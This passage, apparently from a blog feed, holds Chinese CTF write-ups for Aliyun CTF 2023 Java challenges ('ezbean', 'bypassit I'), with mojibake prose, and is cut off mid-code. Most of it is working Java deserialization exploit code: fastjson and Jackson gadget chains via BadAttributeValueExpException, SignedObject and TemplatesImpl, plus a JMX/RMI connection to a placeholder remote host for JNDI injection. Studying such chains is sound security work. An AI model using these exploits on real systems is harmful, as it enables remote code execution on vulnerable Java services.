class_">ConstantTransformer</span>(myexpect);</span><br><span class="line"></span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazymap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">JSONObject</span>(), constantTransformer);</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazymap1</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), constantTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap1, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFiledValue(tiedMapEntry, <span class="string">&quot;map&quot;</span>, lazymap);</span><br><span class="line">        setFiledValue(tiedMapEntry, <span class="string">&quot;key&quot;</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(tiedMapEntry);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray())));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFiledValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pCC6W90"><img src="https://s1.ax1x.com/2023/06/05/pCC6W90.png" alt="pCC6W90.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> competition </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Aliyun CTF 2023 Java</title>
      <link href="/2023/04/26/Aliyun%20CTF/"/>
      <url>/2023/04/26/Aliyun%20CTF/</url>
      
        <content type="html"><![CDATA[<h1 id="Aliyun-CTF-2023"><a href="#Aliyun-CTF-2023" class="headerlink" title="Aliyun CTF 2023"></a>Aliyun CTF 2023</h1><h2 id="ezbean"><a href="#ezbean" class="headerlink" title="ezbean"></a>ezbean</h2><p>ç»™äº†<strong>pom.xml</strong>ï¼Œæœ‰fasjsonä¾èµ–ï¼Œä¸”ç‰ˆæœ¬è¾ƒä½</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.60<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Mybean.getConnect()å¯ä»¥è¿›è¡ŒJMXè¿æ¥</p><p>&#x2F;readè·¯ç”±æœ‰ååºåˆ—åŒ–æ“ä½œï¼Œä¸è¿‡è¿™é‡Œçš„ååºåˆ—åŒ–å‡½æ•°ç”¨çš„æ˜¯é‡å†™è¿‡çš„MyObjectInputStream</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.ezser.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InvalidClassException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] blacklist = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">           <span class="string">&quot;java\\.security.*&quot;</span>, <span class="string">&quot;java\\.rmi.*&quot;</span>,  <span class="string">&quot;com\\.fasterxml.*&quot;</span>, <span class="string">&quot;com\\.ctf\\.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;org\\.springframework.*&quot;</span>, <span class="string">&quot;org\\.yaml.*&quot;</span>, <span class="string">&quot;javax\\.management\\.remote.*&quot;</span></span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">MyObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">      <span class="built_in">super</span>(inputStream);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> Class <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass cls)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">      <span class="keyword">if</span>(!contains(cls.getName())) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(cls);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unexpected serialized class&quot;</span>, cls.getName());</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(String targetValue)</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (String forbiddenPackage : blacklist) &#123;</span><br><span class="line">         <span class="keyword">if</span> (targetValue.matches(forbiddenPackage))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†ä¸€äº›ï¼Œä¸€çœ¼äºŒæ¬¡ååºåˆ—åŒ–ï¼Œç”¨SignedObjectå»è£…å°±è¡Œäº†</p><p>æ‰€ä»¥ï¼Œåªéœ€æƒ³åŠæ³•è°ƒç”¨åˆ°Mybeançš„getterå°±è¡Œäº†ï¼Œè¿™é‡Œç”¨çš„æ˜¯fastjsonçš„tostringè°ƒç”¨ä»»æ„getter</p><p>å¯ä»¥ç®€å•ç»™ä¸ªä¾‹å­çœ‹ä¸€ä¸‹</p><p><strong>Calc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String calc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†æ„é€ å‡½æ•°&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCalc</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†getter&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> calc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCalc</span><span class="params">(String calc)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.calc = calc;</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†setter&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Calc_test</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc_test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Calc</span> <span class="variable">calc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calc</span>();</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">json</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"></span><br><span class="line">        json.put(<span class="string">&quot;a&quot;</span>, calc);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/p9UZJgS"><img src="https://s1.ax1x.com/2023/05/05/p9UZJgS.png" alt="p9UZJgS.png"></a></p><p>åˆ©ç”¨é“¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.toString -&gt; FastJSON -&gt; MyBean.getConnect -&gt; RMIConnector.connect -&gt; JNDI</span><br></pre></td></tr></table></figure><p><strong>EXP</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.ezser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.ctf.ezser.bean.MyBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi:///jndi/rmi://xx.xx.xx.xx:1099/tytpfw&quot;</span>);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL,<span class="literal">null</span>);</span><br><span class="line">        <span class="type">MyBean</span> <span class="variable">myBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyBean</span>(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;aaa&quot;</span>,rmiConnector);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">json</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        json.put(<span class="string">&quot;a&quot;</span>, myBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,json);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        badAttributeValueExpException.toString();</span></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(badAttributeValueExpException,privateKey,signingEngine);</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">json2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        json2.put(<span class="string">&quot;a&quot;</span>, signedObject);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line">        setValue(badAttributeValueExpException2,<span class="string">&quot;val&quot;</span>,json2);</span><br><span class="line"><span class="comment">//        badAttributeValueExpException2.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException2);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Exp.base64Encode(bytes1);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/p9UCeC4"><img src="https://s1.ax1x.com/2023/05/05/p9UCeC4.png" alt="p9UCeC4.png"></a></p><p><a href="https://imgse.com/i/p9UCt8H"><img src="https://s1.ax1x.com/2023/05/05/p9UCt8H.png" alt="p9UCt8H.png"></a></p><h2 id="bypassit-I"><a href="#bypassit-I" class="headerlink" title="bypassit I"></a>bypassit I</h2><p>å›è¿‡å¤´æ¥å‘ç°è¿™æ¡é“¾å­å¤ªåŠäº†~~~</p><p>Spring boot + JDKçš„æ–°çš„ä¸€æ¡åˆ©ç”¨é“¾</p><p>åˆ©ç”¨çš„æ˜¯Jacksonè°ƒç”¨ä»»æ„getterï¼Œå…¶å®å’Œfastjsonçš„è°ƒç”¨å·®ä¸å¤ªå¤š</p><p>ç®€å•çœ‹ä¸ªä¾‹å­</p><p><strong>Calc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bypass_1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String calc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†æ„é€ å‡½æ•°&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCalc</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†getter&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> calc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCalc</span><span class="params">(String calc)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.calc = calc;</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†setter&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>demo1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bypass_1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Calc</span> <span class="variable">calc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calc</span>();</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(calc);</span><br><span class="line">        System.out.println(jsonNodes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/p9d1bq0"><img src="https://s1.ax1x.com/2023/05/07/p9d1bq0.png" alt="p9d1bq0.png"></a></p><p>ç°åœ¨å°±å¯ä»¥æ„é€ POCäº†ï¼Œå’Œä¸Šé¢é‚£æ¡fastjsonçš„æ„é€ å¤§å·®ä¸å·®</p><p><strong>POC</strong></p><p>å»è°ƒTemplatesImpl</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bypass_1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,jsonNodes);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span 